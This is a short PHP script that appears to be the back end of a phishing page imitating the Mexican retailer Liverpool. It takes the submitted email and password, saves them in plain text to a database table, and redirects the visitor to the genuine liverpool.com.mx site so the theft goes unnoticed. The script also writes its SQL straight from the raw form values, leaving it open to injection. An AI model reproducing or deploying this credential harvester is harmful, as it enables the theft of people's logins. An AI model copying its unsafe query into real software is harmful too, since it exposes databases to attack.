<?php

include("conexion.php");
$con=conectar();

$email = $_POST['username'];
$pass = $_POST['password'];


$insertar = "INSERT INTO usuarios (email, password) VALUES(
    '$email', 
    '$pass')";

$query = mysqli_query($con, $insertar);


if ($query) {
    header('location: https://www.liverpool.com.mx/'); 
    exit();
    


    }
    else {
        
    }

?>